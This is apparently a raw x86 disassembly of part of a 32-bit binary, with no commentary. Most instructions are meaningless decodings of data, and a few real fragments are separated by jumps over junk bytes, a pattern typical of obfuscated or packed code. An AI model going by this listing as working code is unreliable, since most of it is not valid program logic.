  4244b4:	aaa    
  4244b5:	xchg   esi,eax
  4244b6:	pop    ds
  4244b7:	inc    edx
  4244b8:	mov    cl,0x97
  4244ba:	xchg   edx,esi
  4244bc:	push   eax
  4244bd:	stos   BYTE PTR es:[edi],al
  4244be:	sub    BYTE PTR ds:0x922fec42,ah
  4244c4:	pop    ebx
  4244c5:	test   al,0x96
  4244c7:	imul   eax,DWORD PTR [eax],0xaf055272
  4244cd:	pop    ds
  4244ce:	test   al,0xe2
  4244d0:	aaa    
  4244d1:	(bad)  
  4244d3:	frstor [edx-0x643d66a4]
  4244d9:	mov    eax,ds:0xd23b2dde
  4244de:	push   eax
  4244df:	ins    DWORD PTR es:[edi],dx
  4244e0:	mov    bl,0xdf
  4244e2:	jne    0x424563
  4244e4:	cmp    eax,0xe45b5db9
  4244e9:	dec    ecx
  4244ea:	jmp    0x15ab:0x49215700
  4244f1:	out    dx,al
  4244f2:	mov    DWORD PTR ds:0xafb654f,esi
  4244f8:	jg     0x42452f
  4244fa:	cdq    
  4244fb:	bound  ebp,QWORD PTR [ebp+0x6d8f6206]
  424501:	std    
  424502:	mov    DWORD PTR [eax-0x5321aa3a],ecx
  424508:	sbb    al,0x30
  42450a:	or     ch,0x1e
  42450d:	out    dx,eax
  42450e:	push   ds
  42450f:	fbstp  TBYTE PTR ds:0x95d08737
  424515:	and    eax,DWORD PTR [eax-0x8f304ea]
  42451b:	mov    ds:0xd46b9b92,al
  424520:	mov    dh,0x63
  424522:	sub    al,0xb0
  424524:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424525:	mul    DWORD PTR [eax+0x25]
  424528:	bnd jae 0x42451d
  42452b:	into   
  42452c:	push   es
  42452d:	pushf  
  42452e:	sbb    DWORD PTR [eax+0x679e6edd],0x2a
  424535:	les    ebp,FWORD PTR [esi]
  424537:	jne    0x4244e2
  424539:	jp     0x4244de
  42453b:	mul    DWORD PTR [esp+0x18]
  42453f:	mov    ecx,eax
  424541:	mov    eax,DWORD PTR [esp+0x14]
  424545:	mul    esi
  424547:	add    edx,ecx
  424549:	jb     0x424717
  42454f:	cmp    edx,DWORD PTR [esp+0x10]
  424553:	jmp    0x42462a
  424558:	enter  0xa473,0xd6
  42455c:	mov    edi,0xb77ffad7
  424561:	jne    0x424579
  424563:	mov    ebx,0x380244ab
  424568:	cli    
  424569:	stos   DWORD PTR es:[edi],eax
  42456a:	add    DWORD PTR [eax],eax
  42456c:	mov    edx,0x28000000
  424571:	in     eax,0xfd
  424573:	jge    0x4244f6
  424575:	enter  0x646e,0x73
  424579:	scas   al,BYTE PTR es:[edi]
  42457a:	jno    0x42458b
  42457c:	mov    al,0x1
  42457e:	xor    BYTE PTR [esi-0x4e],bl
  424581:	jp     0x42458f
  424583:	jle    0x42451b
  424585:	xor    al,0xe5
  424587:	cmp    dl,bl
  424589:	cli    
  42458a:	xchg   edi,edi
  42458c:	dec    edx
  42458d:	pusha  
  42458e:	leave  
  42458f:	mov    ebp,0x630a005b
  424594:	mov    ds:0x51550c20,al
  424599:	shl    DWORD PTR [ebp+eiz*4+0x1c348b7],0x20
  4245a1:	adc    bh,BYTE PTR [edx-0x73fd8cf9]
  4245a7:	lahf   
  4245a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245a9:	lock popa 
  4245ab:	pop    eax
  4245ac:	aaa    
  4245ad:	lock xchg edx,eax
  4245af:	lods   eax,DWORD PTR ds:[esi]
  4245b0:	mov    al,0xdc
  4245b2:	push   eax
  4245b3:	outs   dx,DWORD PTR ss:[esi]
  4245b5:	and    BYTE PTR [esi+0x13],bh
  4245b8:	mov    cl,0x42
  4245ba:	inc    ecx
  4245bb:	jmp    0xca2b:0x465741eb
  4245c2:	push   eax
  4245c3:	push   ebp
  4245c4:	fucomi st,st(0)
  4245c6:	cmp    al,0xfb
  4245c8:	dec    BYTE PTR ds:0x728e8cef
  4245ce:	scas   al,BYTE PTR es:[edi]
  4245cf:	and    BYTE PTR [eax],dh
  4245d1:	call   0xfc8:0x68c7e2b8
  4245d8:	pop    ecx
  4245d9:	pop    esp
  4245da:	shl    DWORD PTR [ebx],0xc9
  4245dd:	push   edi
  4245de:	mov    esi,0x60869236
  4245e3:	test   bh,0x23
  4245e6:	mov    DWORD PTR [esi-0x25],esi
  4245e9:	inc    esi
  4245ea:	cwde   
  4245eb:	stos   BYTE PTR es:[edi],al
  4245ec:	sbb    dl,bh
  4245ee:	mov    dh,0x40
  4245f0:	mov    ch,0xfd
  4245f2:	fwait
  4245f3:	jecxz  0x424613
  4245f5:	sar    ah,cl
  4245f7:	jecxz  0x4245a0
  4245f9:	fild   QWORD PTR [eax+0x1145752a]
  4245ff:	pop    eax
  424600:	push   edi
  424601:	loopne 0x424681
  424603:	mov    esi,es
  424605:	repnz mov esi,DWORD PTR [eax-0x5d]
  424609:	adc    dh,bl
  42460b:	xor    al,0x35
  42460d:	adc    ecx,ebp
  42460f:	mov    bl,0x36
  424611:	push   0x870c4899
  424616:	pop    esp
  424617:	jo     0x42466a
  424619:	stos   BYTE PTR es:[edi],al
  42461a:	add    eax,0xb811b32b
  42461f:	icebp  
  424620:	cld    
  424621:	adc    al,0xe9
  424623:	dec    esp
  424624:	or     al,0x66
  424626:	cli    
  424627:	aad    0x5a
  424629:	retf   
  42462a:	ja     0x424717
  424630:	jmp    0x424707
  424635:	enter  0x3753,0x56
  424639:	mov    edi,0x69dfe976
  42463e:	or     DWORD PTR [esi+0x69],0xffffffe0
  424642:	mov    dh,0xa0
  424644:	xor    esi,DWORD PTR [esp+ebp*4+0xba0001]
  42464b:	add    BYTE PTR [eax],al
  42464d:	out    0x5,eax
  42464f:	mov    ah,0xfb
  424651:	add    al,0xf4
  424653:	mov    bh,0xc2
  424655:	xchg   ah,al
  424657:	(bad)  
  424658:	scas   al,BYTE PTR es:[edi]
  424659:	out    dx,eax
  42465a:	stc    
  42465b:	xchg   ebx,ebx
  42465d:	push   esi
  42465e:	xor    cl,dl
  424660:	adc    BYTE PTR [eax],0xd6
  424663:	mov    ebp,0xe5fd16b0
  424668:	mul    dh
  42466a:	or     al,0xd1
  42466c:	cmc    
  42466d:	clc    
  42466e:	push   0x66
  424670:	(bad)  
  424671:	xchg   edi,eax
  424672:	or     esi,0x63c1e339
  424678:	sub    eax,eax
  42467a:	dec    ebx
  42467b:	lahf   
  42467c:	push   0x6a
  42467e:	pop    edi
  42467f:	mov    eax,ds:0xd129f73
  424684:	mov    al,0xf1
  424686:	shr    DWORD PTR [esi-0x2b80ae83],1
  42468c:	test   BYTE PTR [ebx+0x66],cl
  42468f:	dec    eax
  424690:	ror    BYTE PTR [ebx-0x54],cl
  424693:	iret   
  424694:	pop    ecx
  424695:	out    dx,eax
  424696:	stos   DWORD PTR es:[edi],eax
  424697:	cmp    ah,BYTE PTR [ebx-0x4f]
  42469a:	mov    ecx,0xc7dd6320
  42469f:	fstp   TBYTE PTR [eax+esi*1-0x71]
  4246a3:	jns    0x424707
  4246a5:	aaa    
  4246a6:	cmp    ebx,DWORD PTR [esi]
  4246a8:	repz adc DWORD PTR [ebx+0x31],ebx
  4246ac:	cmp    DWORD PTR [edi+0x44],ebp
  4246af:	std    
  4246b0:	or     ecx,DWORD PTR [edi-0x31721705]
  4246b6:	nop
  4246b7:	sbb    cl,al
  4246b9:	in     eax,0xeb
  4246bb:	xchg   esi,ecx
  4246bd:	call   0x51636b8a
  4246c2:	in     eax,0x6
  4246c4:	jmp    0x7938:0x1b1e5f4e
  4246cb:	adc    al,0x4e
  4246cd:	sub    edx,ebx
  4246cf:	fistp  WORD PTR [ebp+0x54]
  4246d2:	aam    0x11
  4246d4:	add    al,ch
  4246d6:	lock cmp DWORD PTR [ebx-0x3f60f0f5],ebx
  4246dd:	ins    DWORD PTR es:[edi],dx
  4246de:	jg     0x4246bf
  4246e0:	int    0xaf
  4246e2:	(bad)  [ebp+0xb]
  4246e5:	cld    
  4246e6:	jb     0x4246e6
  4246e8:	xchg   ebx,eax
  4246e9:	xchg   BYTE PTR [esi+0x33],al
  4246ec:	(bad)  
  4246ed:	rol    DWORD PTR [ecx],cl
  4246ef:	ins    DWORD PTR es:[edi],dx
  4246f0:	rol    BYTE PTR gs:0x49f483ef,0x9
  4246f8:	das    
  4246f9:	mov    ds:0xe939087e,al
  4246fe:	mov    esi,DWORD PTR [ebx-0x68]
  424701:	xlat   BYTE PTR ds:[ebx]
  424702:	data16 lock ja 0x4246d6
  424706:	jnp    0x424717
  424708:	or     BYTE PTR [ebx],0x0
  42470b:	add    BYTE PTR [eax],al
  42470d:	cmp    eax,DWORD PTR [esp+0xc]
  424711:	jbe    0x424718
  424717:	dec    esi
  424718:	xor    edx,edx
  42471a:	jmp    0x4247f1
  42471f:	scas   al,BYTE PTR es:[edi]
  424720:	push   ebx
  424721:	mov    edi,0xbfecff8c
  424726:	jae    0x424721
  424728:	pushf  
  424729:	loopne 0x424763
  42472b:	jae    0x42475e
  42472d:	enter  0x6e70,0xad
  424731:	add    DWORD PTR [eax],eax
  424733:	mov    edx,0x1000000
  424738:	(bad)  
  424739:	repz fsubr QWORD PTR [edi-0x51dde2cb]
  424740:	ss or  al,0xa6
  424743:	call   0x6d63dec2
  424748:	xchg   DWORD PTR [edx+0xa],esi
  42474b:	add    BYTE PTR [esi],0x76
  42474e:	mul    DWORD PTR [eax+0xf82f897]
  424754:	lods   eax,DWORD PTR ds:[esi]
  424755:	sub    DWORD PTR [edx+eiz*4+0x86c3037],esi
  42475c:	push   ebx
  42475d:	hlt    
  42475e:	mov    bl,0xff
  424760:	(bad)  
  424761:	mov    ds:0xede19699,eax
  424766:	call   0xcf5ae3ef
  42476b:	shr    DWORD PTR [esi+0x40],1
  42476e:	pop    ecx
  42476f:	stc    
  424770:	mov    al,ds:0x6a6e4800
  424775:	shr    DWORD PTR [edi-0x54e3a9a],1
  42477b:	sti    
  42477c:	push   ebx
  42477d:	test   al,0x8f
  42477f:	hlt    
  424780:	jp     0x424731
  424782:	mov    BYTE PTR [esp+edi*1-0x55],ch
  424786:	inc    ecx
  424787:	push   ebx
  424788:	rol    dh,cl
  42478a:	inc    esp
  42478b:	pop    edi
  42478c:	and    DWORD PTR [edi-0x62],0x2f
  424790:	jns    0x42473e
  424792:	push   edx
  424793:	in     eax,0x68
  424795:	neg    BYTE PTR [ebp-0x6773b550]
  42479b:	int    0x14
  42479d:	or     ebx,DWORD PTR [edx]
  42479f:	pop    es
  4247a0:	jbe    0x424766
  4247a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4247a3:	hlt    
  4247a4:	xchg   esi,eax
  4247a5:	clc    
  4247a6:	sbb    bh,BYTE PTR [edi]
  4247a8:	(bad)  
  4247a9:	(bad)  
  4247aa:	push   ds
  4247ab:	inc    esp
  4247ac:	stc    
  4247ad:	lods   al,BYTE PTR ds:[esi]
  4247ae:	sub    cl,ch
  4247b0:	bound  esp,QWORD PTR [ecx]
  4247b2:	rcr    BYTE PTR [ecx+0xa6305f4],cl
  4247b8:	add    eax,0xf8a55dfb
  4247bd:	push   edi
  4247be:	retf   
  4247bf:	cmp    bh,BYTE PTR [ebp+ecx*8+0x5f8f22c]
  4247c6:	dec    ebp
  4247c7:	hlt    
  4247c8:	sbb    BYTE PTR [eax+0x35efa4ee],0x15
  4247cf:	inc    eax
  4247d0:	hlt    
  4247d1:	adc    BYTE PTR [ebx],ah
  4247d3:	jnp    0x42475e
  4247d5:	call   0xaa6b:0x30e8c5cd
  4247dc:	out    dx,al
  4247dd:	cmp    al,BYTE PTR ds:0x8d8eb6b1
  4247e3:	aas    
  4247e4:	and    BYTE PTR [eax+0x21],dl
  4247e7:	mov    ch,0x19
  4247e9:	push   0xd0e2a8cf
  4247ee:	mov    dl,0xb5
  4247f0:	xchg   BYTE PTR [ebx+0xd2e9c6],cl
  4247f6:	add    BYTE PTR [eax],al
  4247f8:	iret   
  4247f9:	fstp   DWORD PTR [ecx]
  4247fb:	nop
  4247fc:	pop    ds
  4247fd:	ror    bh,1
  4247ff:	(bad)  
  424801:	push   esp
  424802:	xor    eax,0x570a2bc7
  424807:	ret    
  424808:	sub    BYTE PTR [esi+0xba0001],ch
  42480e:	add    BYTE PTR [eax],al
  424810:	jb     0x4247d5
  424812:	scas   eax,DWORD PTR es:[edi]
  424813:	ds adc al,0x6
  424816:	into   
  424817:	cmp    al,0xfb
  424819:	xchg   ebx,eax
  42481a:	add    bl,BYTE PTR es:[eax+0x18a32f79]
  424821:	add    DWORD PTR gs:[edx-0x3],ebx
  424825:	pop    ebp
  424826:	pushf  
  424827:	push   edi
  424828:	mov    bh,0x34
  42482a:	out    0x21,al
  42482c:	imul   esi,DWORD PTR [esi],0x328b8177
  424832:	aaa    
  424833:	add    esi,ecx
  424835:	sub    ebx,DWORD PTR ds:0x10b84e9f
  42483b:	inc    ebp
  42483c:	push   cs
  42483d:	stos   DWORD PTR es:[edi],eax
  42483e:	add    al,0xd2
  424840:	mov    eax,ds:0xaf498eed
  424845:	in     al,dx
  424846:	addr16 call 0x409b:0xc18f8bd5
  42484e:	cmp    esp,DWORD PTR [esi+0x7e]
  424851:	push   edx
  424852:	rcl    DWORD PTR [esi+0x4b],0xcd
  424856:	test   ebp,ecx
  424858:	ret    
  424859:	inc    ecx
  42485a:	mov    bl,0x51
  42485c:	retf   
  42485d:	mov    edi,0x60657fdf
  424862:	mov    ds:0x60509309,eax
  424867:	add    BYTE PTR [esi],bh
  424869:	and    BYTE PTR [ebx],dl
  42486b:	loope  0x4248a8
  42486d:	add    ebx,0x6f
  424870:	ja     0x4248b8
  424872:	jb     0x4247f6
  424874:	fmul   st(0),st
  424876:	imul   eax,DWORD PTR [esi],0x4a
  424879:	push   ss
  42487a:	mov    eax,0x4db4845d
  42487f:	test   DWORD PTR [edx-0x15],esi
  424882:	sbb    eax,0xb59b73ec
  424887:	and    al,0x63
  424889:	imul   ebp,DWORD PTR [ebx+ebp*1],0xed928d59
  424890:	jg     0x4248e6
  424892:	and    bl,BYTE PTR [ecx-0x22]
  424895:	(bad)  
  424896:	sbb    DWORD PTR [edx+0x67fd7b20],edi
  42489c:	push   esp
  42489d:	push   ebx
  42489e:	fs jnp 0x424874
  4248a1:	lock push edx
  4248a3:	lock xor DWORD PTR [esi+0x68],ebx
  4248a7:	nop
  4248a8:	aad    0x35
  4248aa:	mov    ah,0x4a
  4248ac:	push   es
  4248ad:	adc    al,0x85
  4248af:	push   eax
  4248b0:	fxch   st(0)
  4248b2:	push   ebp
  4248b3:	fisubr DWORD PTR [edi+eax*4+0x1e]
  4248b7:	pop    es
  4248b8:	mov    al,0xd9
  4248ba:	fwait
  4248bb:	push   esp
  4248bc:	popa   
  4248bd:	ret    
  4248be:	pop    edi
  4248bf:	outs   dx,BYTE PTR ds:[esi]
  4248c0:	iret   
  4248c1:	inc    eax
  4248c2:	pop    es
  4248c3:	les    ebx,FWORD PTR [ecx+ebp*1+0x53]
  4248c7:	sub    al,0xb7
  4248c9:	pop    ecx
  4248ca:	pop    esi
  4248cb:	jmp    0x4249a2
  4248d0:	sub    eax,0x98b018b5
  4248d5:	mov    ebp,0x194cbdad
  4248da:	lds    esi,FWORD PTR [ebx]
  4248dc:	fsubr  DWORD PTR [esp+esi*8+0x1aee238]
  4248e3:	add    BYTE PTR [edx+0x75000000],bh
  4248e9:	inc    ecx
  4248ea:	push   esi
  4248eb:	mov    al,ds:0x6ef88cb1
  4248f0:	pop    ebx
  4248f1:	mov    DWORD PTR ds:0xba1dc040,edx
  4248f7:	ret    
  4248f8:	sub    bh,bl
  4248fa:	nop
  4248fb:	cld    
  4248fc:	nop
  4248fd:	jno    0x424971
  4248ff:	xchg   edi,eax
  424900:	jge    0x4248e5
  424902:	fsub   QWORD PTR [edi+0x17]
  424905:	pusha  
  424906:	xchg   edi,eax
  424907:	mov    esp,0x4854320d
  42490c:	bnd jge 0x4248d4
  42490f:	mov    ebp,0x8070adf3
  424914:	adc    esp,eax
  424916:	fucomip st,st(6)
  424918:	mov    eax,0xdcb7e41e
  42491d:	ins    DWORD PTR es:[edi],dx
  42491e:	mov    ds:0xc1a9cfac,al
  424923:	dec    esp
  424924:	repnz sahf 
  424926:	aaa    
  424927:	inc    ecx
  424928:	mov    esp,0xa4ad0788
  42492d:	mov    edi,0x4dc90769
  424932:	or     esi,DWORD PTR [edx-0x4b]
  424935:	jmp    0x4248c5
  424937:	fnstenv [ebp+0x54b64f6a]
  42493d:	rcl    BYTE PTR [edi],1
  42493f:	dec    esp
  424940:	ror    DWORD PTR [esi],1
  424942:	aam    0x73
  424944:	mov    ebx,0x259a737b
  424949:	jne    0x424901
  42494b:	and    BYTE PTR [edi],0x54
  42494e:	dec    esp
  42494f:	dec    ebp
  424950:	into   
  424951:	jo     0x4249c8
  424953:	sub    eax,0x70a583f
  424958:	je     0x4248e6
  42495a:	(bad)  
  42495b:	and    ah,BYTE PTR [eax+0x2b]
  42495e:	out    dx,al
  42495f:	mov    WORD PTR [ebx-0x37f9064b],?
  424965:	push   es
  424966:	mov    eax,0xe705963b
  42496b:	dec    ebp
  42496c:	pop    ecx
  42496d:	es fwait
  42496f:	push   es
  424970:	nop
  424971:	std    
  424972:	jecxz  0x42496d
  424974:	sub    cl,bh
  424976:	fist   WORD PTR [ecx-0x3b]
  424979:	daa    
  42497a:	jl     0x4249f9
  42497c:	mov    dl,0x17
  42497e:	(bad)  
  42497f:	out    dx,eax
  424980:	into   
  424981:	or     al,0x31
  424983:	add    DWORD PTR [ebp-0x50],ebx
  424986:	ficom  WORD PTR [eax]
  424988:	ror    BYTE PTR [esi],0x4f
  42498b:	push   ds
  42498c:	js     0x4249be
  42498e:	rol    DWORD PTR [ebx-0x4e],1
  424991:	call   0xd57:0xad58bfb9
  424998:	push   esi
  424999:	push   ebp
  42499a:	push   edx
  42499b:	outs   dx,DWORD PTR ds:[esi]
  42499c:	mov    esp,DWORD PTR [eax-0x75d5d409]
  4249a2:	pop    ebx
  4249a3:	ret    0x10
  4249a6:	push   ebp
  4249a7:	mov    ebp,esp
  4249a9:	sub    esp,0x38
  4249ac:	push   ebx
  4249ad:	jmp    0x424a72
  4249b2:	or     ecx,0xffffffec
  4249b5:	inc    edi
  4249b6:	out    dx,al
  4249b7:	stos   DWORD PTR es:[di],eax
  4249b9:	int    0x94
  4249bb:	cli    
  4249bc:	stos   BYTE PTR es:[edi],al
  4249bd:	mov    eax,ds:0x38ff164c
  4249c2:	pushf  
  4249c3:	scas   eax,DWORD PTR es:[edi]
  4249c4:	add    DWORD PTR [eax],eax
  4249c6:	test   al,0x0
  4249c8:	add    BYTE PTR [eax],al
  4249ca:	adc    eax,0xc6350df0
  4249cf:	sbb    dl,BYTE PTR es:[ebp+0x14]
  4249d3:	mov    cl,0x1e
  4249d5:	jno    0x4249e8
  4249d7:	mov    cl,0x97
  4249d9:	mov    DWORD PTR [ecx],edx
  4249db:	inc    ecx
  4249dc:	lods   al,BYTE PTR ds:[esi]
  4249dd:	std    
  4249de:	pop    es
  4249df:	cmc    
  4249e0:	rcr    DWORD PTR [si],1
  4249e3:	lds    ecx,FWORD PTR [esi+0x40]
  4249e6:	pop    edx
  4249e7:	nop
  4249e8:	xchg   ecx,ebp
  4249ea:	fcmovnu st,st(3)
  4249ec:	jno    0x4249e8
  4249ee:	pop    ebp
  4249ef:	mov    cl,BYTE PTR [ecx]
  4249f1:	hlt    
  4249f2:	push   ds
  4249f3:	jne    0x424982
  4249f5:	(bad)  
  4249f7:	mov    cs,ebp
  4249f9:	jmp    0x424a0a
  4249fb:	movzx  ecx,BYTE PTR ds:0xc4eb5172
  424a02:	loopne 0x4249f4
  424a04:	mov    bl,0x90
  424a06:	gs (bad) 
  424a08:	out    0x2e,al
  424a0a:	mov    ah,0x17
  424a0c:	cmp    al,al
  424a0e:	push   ecx
  424a0f:	(bad)  
  424a10:	aad    0xe4
  424a12:	jns    0x4249dc
  424a14:	cmc    
  424a15:	cwde   
  424a16:	(bad)  
  424a17:	das    
  424a18:	inc    esi
  424a19:	jno    0x424a71
  424a1b:	dec    esi
  424a1c:	mov    edx,DWORD PTR [ecx-0x55]
  424a1f:	ror    DWORD PTR [ecx-0x79],1
  424a22:	retf   0x7c25
  424a25:	fs enter 0xf65e,0xeb
  424a2a:	mov    bl,ah
  424a2c:	xchg   ebx,eax
  424a2d:	sbb    ch,BYTE PTR [esi]
  424a2f:	mov    WORD PTR [esi+0x78],es
  424a32:	or     al,0x3a
  424a34:	dec    edi
  424a35:	add    BYTE PTR [edx+0x1cc8bee9],cl
  424a3b:	into   
  424a3c:	dec    ebx
  424a3d:	loop   0x424a19
  424a3f:	adc    BYTE PTR [eax],dh
  424a41:	pop    esp
  424a42:	ins    DWORD PTR es:[edi],dx
  424a43:	xor    BYTE PTR [edx],ch
  424a45:	loopne 0x424a3b
  424a47:	push   edx
  424a48:	rcr    DWORD PTR ds:[eax],1
  424a4b:	xchg   ebp,eax
  424a4c:	ins    DWORD PTR es:[edi],dx
  424a4d:	mov    bl,0xdd
  424a4f:	hlt    
  424a50:	mov    esi,0x1a659527
  424a55:	mov    dh,BYTE PTR [ebx+0x34]
  424a58:	aad    0x98
  424a5a:	repnz sahf 
  424a5c:	call   0xc950e9c2
  424a61:	in     al,dx
  424a62:	sbb    BYTE PTR [esi+ecx*4+0x59],0xf1
  424a67:	pusha  
  424a68:	std    
  424a69:	sti    
  424a6a:	sub    ebx,ebp
  424a6c:	inc    esi
  424a6d:	clc    
  424a6e:	pop    eax
  424a6f:	sub    al,0x3f
  424a71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424a72:	push   esi
  424a73:	push   edi
  424a74:	mov    DWORD PTR [ebp-0xc],0xb89
  424a7b:	mov    DWORD PTR [ebp-0x8],0x79d
  424a82:	mov    DWORD PTR [ebp-0x4],0x1206
  424a89:	mov    DWORD PTR [ebp-0x1c],0x5d18
  424a90:	mov    DWORD PTR [ebp-0x18],0x507f
  424a97:	mov    DWORD PTR [ebp-0x14],0x1787
  424a9e:	mov    DWORD PTR [ebp-0x10],0x5eb4
  424aa5:	mov    DWORD PTR [ebp-0x38],0x3718
  424aac:	mov    DWORD PTR [ebp-0x34],0x6bad
  424ab3:	jmp    0x424b78
  424ab8:	jae    0x424aad
  424aba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424abb:	cmp    esp,DWORD PTR [edi-0x3c040081]
  424ac1:	mov    edi,0x804656a
  424ac6:	fidivr WORD PTR [ecx]
  424ac8:	inc    esp
  424ac9:	mov    al,0x1
  424acb:	add    BYTE PTR [eax-0x16000000],ch
  424ad1:	adc    BYTE PTR [esp+esi*4-0x6d],bh
  424ad5:	xor    DWORD PTR [esp+eiz*2+0x42dce84b],esi
  424adc:	das    
  424add:	or     ebp,ebx
  424adf:	xchg   ebx,eax
  424ae0:	xchg   DWORD PTR [ebx+0x3e],ecx
  424ae3:	test   al,0x91
  424ae5:	xchg   ebp,eax
  424ae6:	adc    edx,DWORD PTR [edi-0x146dbb47]
  424aec:	mov    edi,0xe8aec85b
  424af1:	sbb    BYTE PTR [ebp-0x8c1498c],al
  424af7:	cmp    eax,0x6e1daf32
  424afc:	jmp    0x424abe
  424afe:	push   0x6
  424b00:	arpl   WORD PTR [ecx],cx
  424b02:	lea    esp,[edx]
  424b04:	or     eax,0x8f08a8a5
  424b09:	push   ebx
  424b0a:	adc    DWORD PTR [edi-0x69],0x486a0841
  424b11:	call   0x72e9:0xaabe9716
  424b18:	mov    ah,0x8e
  424b1a:	pop    ecx
  424b1b:	aam    0x45
  424b1d:	dec    BYTE PTR [ebx+esi*1-0x1e3b5e3a]
  424b24:	jns    0x424af1
  424b26:	push   esi
  424b27:	cmp    DWORD PTR [eax+0xd],ebx
  424b2a:	ret    0x22f1
  424b2d:	and    ebp,DWORD PTR [esi+0x3ac09625]
  424b33:	(bad)  
  424b34:	ficom  DWORD PTR [ecx+0x6d]
  424b37:	nop
  424b38:	mov    bl,0xe2
  424b3a:	cdq    
  424b3b:	mov    dl,0xe7
  424b3d:	push   ss
  424b3e:	mov    edx,DWORD PTR [ebx+0x40f86f10]
  424b44:	test   BYTE PTR [ebp-0xaf89539],cl
  424b4a:	cmc    
  424b4b:	sbb    ebx,DWORD PTR [edi+0x11]
  424b4e:	ror    BYTE PTR [ebp-0x3],1
  424b51:	jnp    0x424b97
  424b53:	xor    al,0xb3
  424b55:	ret    0x1cb5
  424b58:	imul   eax,DWORD PTR [edx+edi*8-0x13],0x358f8b13
  424b60:	add    eax,0x157da32a
  424b65:	xchg   edx,eax
  424b66:	and    eax,0x9c70d94e
  424b6b:	movups xmm7,XMMWORD PTR [edx-0x6812520c]
  424b72:	sbb    dh,dl
  424b74:	outs   dx,BYTE PTR ds:[esi]
  424b75:	adc    ecx,esp
  424b77:	mov    cl,0xc7
  424b79:	inc    ebp
  424b7a:	rcl    BYTE PTR [eax],1
  424b7c:	add    BYTE PTR [eax],al
  424b7e:	add    bh,al
  424b80:	inc    ebp
  424b81:	aam    0xbe
  424b83:	and    al,BYTE PTR [eax]
  424b85:	add    bh,al
  424b87:	inc    ebp
  424b88:	fcom   st(5)
  424b8a:	add    eax,DWORD PTR [eax]
  424b8c:	add    cl,ch
  424b8e:	rol    BYTE PTR [eax],0x0
  424b91:	add    BYTE PTR [esi+0x27],dh
  424b94:	mov    eax,0xfebff924
  424b99:	ja     0x424b4b
  424b9b:	retf   0xe457
  424b9e:	jmp    FWORD PTR [eax+ecx*2-0x1c]
  424ba2:	in     al,dx
  424ba3:	mov    al,0x1
  424ba5:	add    BYTE PTR [eax+0x6b000000],ch
  424bab:	scas   eax,DWORD PTR es:[edi]
  424bac:	pop    esi
  424bad:	xor    eax,0x90714a9f
  424bb2:	or     eax,0xc26372d
  424bb7:	push   eax
  424bb8:	mov    ah,0x1c
  424bba:	aad    0x8c
  424bbc:	mov    edx,ebp
  424bbe:	sbb    edx,DWORD PTR [edx+0x45]
  424bc1:	push   edi
  424bc2:	xchg   ecx,eax
  424bc3:	xor    esp,DWORD PTR [ecx+0x30fc8e7e]
  424bc9:	pop    es
  424bca:	mov    ds:0x26cd8e7a,al
  424bcf:	xor    eax,0xe7d3ec52
  424bd4:	jecxz  0x424c02
  424bd6:	icebp  
  424bd7:	jmp    0xba73bf23
  424bdc:	pop    edx
  424bdd:	test   eax,0xf8e23beb
  424be2:	loop   0x424bf4
  424be4:	fwait
  424be5:	or     eax,0x4486ff64
  424bea:	cld    
  424beb:	(bad)  
  424bec:	(bad)  
  424bed:	in     eax,dx
  424bee:	push   cs
  424bef:	xchg   esi,eax
  424bf0:	pop    ebx
  424bf1:	stc    
  424bf2:	pop    ebx
  424bf3:	sti    
  424bf4:	aad    0x6
  424bf6:	sub    edi,DWORD PTR [ebx]
  424bf8:	lods   eax,DWORD PTR ds:[esi]
  424bf9:	pushf  
  424bfa:	daa    
  424bfb:	push   ebx
  424bfc:	adc    BYTE PTR [ebp+0x51],0x31
  424c00:	test   al,0xd7
  424c02:	mov    ecx,DWORD PTR [eax]
  424c04:	hlt    
  424c05:	and    cl,BYTE PTR [esi]
  424c07:	fcomp  DWORD PTR [eax-0x5a35e471]
  424c0d:	adc    eax,0x1dfbc993
  424c12:	pandn  mm5,QWORD PTR [ecx+0x67]
  424c16:	ret    
  424c17:	aas    
  424c18:	clc    
  424c19:	and    eax,ecx
  424c1b:	jns    0x424c9c
  424c1d:	xor    al,0x2
  424c1f:	add    BYTE PTR [edi+0x7137d38c],bl
  424c25:	fucom  st(4)
  424c27:	mov    eax,0x5e91770a
  424c2c:	push   cs
  424c2d:	ror    BYTE PTR [ebp-0x7c914848],1
  424c33:	repz dec ebx
  424c35:	stos   BYTE PTR es:[edi],al
  424c36:	ficomp WORD PTR [esi+0x7a]
  424c39:	ror    BYTE PTR [ebp+0x3cda4fa8],0xfe
  424c40:	xor    DWORD PTR [eax+esi*2],edi
  424c43:	icebp  
  424c44:	fwait
  424c45:	mov    dh,0x90
  424c47:	call   0xf93f:0xed409651
  424c4e:	jne    0x424c58
  424c50:	push   0xdc45c7e5
  424c55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424c56:	add    al,BYTE PTR [eax]
  424c58:	add    cl,ch
  424c5a:	rol    BYTE PTR [eax],0x0
  424c5d:	add    BYTE PTR [esi],bl
  424c5f:	mov    bh,0x9e
  424c61:	pop    ebx
  424c62:	mov    edi,0x8f7df7b
  424c67:	std    
  424c68:	adc    al,0x33
  424c6a:	and    ch,BYTE PTR [esi]
  424c6c:	ror    ebp,cl
  424c6e:	xchg   esp,eax
  424c6f:	mov    cl,0x1
  424c71:	add    BYTE PTR [eax+0x6d000000],ch
  424c77:	sub    dh,BYTE PTR [edx-0x272e50d4]
  424c7d:	pop    ss
  424c7e:	push   0xbb50c219
  424c83:	mov    dh,0x5b
  424c85:	pusha  
  424c86:	pop    edi
  424c87:	jo     0x424ca8
  424c89:	cs pop es
  424c8b:	xchg   edx,esi
  424c8d:	jb     0x424cbf
  424c8f:	loope  0x424cff
  424c91:	jo     0x424cdf
  424c93:	(bad)  
  424c94:	fwait
  424c95:	adc    BYTE PTR [ecx],bl
  424c97:	cld    
  424c98:	mov    eax,ds:0xb1fb3dec
  424c9d:	or     eax,0x831b6ae4
  424ca2:	fsub   DWORD PTR [edx+0x3]
  424ca5:	pop    ebp
  424ca6:	hlt    
  424ca7:	mov    edx,0xd7485ac0
  424cac:	int3   
  424cad:	add    bh,BYTE PTR ds:0x40df7079
  424cb3:	cmp    ecx,DWORD PTR [edi-0x63]
  424cb6:	test   edi,ebx
  424cb8:	xchg   edi,eax
  424cb9:	pop    eax
  424cba:	stos   DWORD PTR es:[edi],eax
